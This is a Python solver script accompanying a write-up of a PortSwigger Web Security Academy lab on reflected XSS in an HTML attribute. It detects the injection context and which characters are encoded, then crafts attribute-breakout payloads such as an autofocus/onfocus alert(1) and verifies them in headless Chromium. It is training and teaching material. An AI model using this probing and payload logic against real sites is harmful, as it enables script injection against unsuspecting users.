#!/usr/bin/env python3
"""
Reflected XSS into attribute with angle brackets HTML-encoded
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 07-reflected-xss-attribute-angle-brackets-encoded.md

What this does:
    Confirms the search term lands inside a double-quoted HTML attribute
    and that angle brackets are HTML-encoded but the quote character isn't,
    then closes the attribute and injects a new event-handler attribute.

    Note on payload choice: the writeup's "Exploit" section shows
    `" onmouseover="alert(1)` to match PortSwigger's own manual walkthrough
    (onmouseover fires when a human hovers the mouse over the element). Our
    actual automated pipeline -- craft_xss_payload()'s attribute-context
    branch -- uses `" autofocus onfocus="alert(1)` instead, exactly as the
    writeup's "Comparing Notes" section explains: autofocus/onfocus fires
    immediately on page load with no simulated mouse movement required,
    which a headless browser can't reliably produce. This script implements
    what our pipeline actually ran, not the mouse-driven variant.

Usage:
    python 07-reflected-xss-attribute-angle-brackets-encoded.py <lab-url>
    e.g. python 07-reflected-xss-attribute-angle-brackets-encoded.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import re
import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

CANARY = "xssCANARY7531"


def classify_and_craft(client: httpx.Client, lab_url: str) -> str:
    """Reproduces detect_reflected_xss() + craft_xss_payload()'s attribute-context branch."""
    r = client.get(lab_url, params={"search": CANARY})
    if CANARY not in r.text:
        raise RuntimeError("canary not reflected in 'search' parameter")

    if re.search(rf"<[^>]+{CANARY}", r.text, re.IGNORECASE):
        context = "attribute"
    else:
        context = "html"
    print(f"[+] Context classified as: {context}")

    angle_encoded = False
    r = client.get(lab_url, params={"search": f"{CANARY}<>"})
    if "&lt;" in r.text or "&gt;" in r.text:
        angle_encoded = True
        print("[*] Angle brackets are HTML-encoded")

    dbl_quote_encoded = False
    r = client.get(lab_url, params={"search": f'{CANARY}"'})
    if "&quot;" in r.text or "&#34;" in r.text:
        dbl_quote_encoded = True
        print("[*] Double quotes are HTML-encoded")
    else:
        print("[*] Double quotes are NOT encoded -- the attribute can be closed")

    if context != "attribute":
        raise RuntimeError(f"unexpected context for this lab: {context}")

    if angle_encoded and dbl_quote_encoded:
        payload = "' autofocus onfocus='alert(1)"
    elif angle_encoded:
        payload = '" autofocus onfocus="alert(1)'  # fires headlessly, no mouse event needed
    else:
        payload = '"><script>alert(1)</script>'

    return payload


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    payload = classify_and_craft(client, lab_url)
    print(f"[*] Crafted payload: {payload}")

    url = f"{lab_url}/?search={urllib.parse.quote(payload)}"

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'}")

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
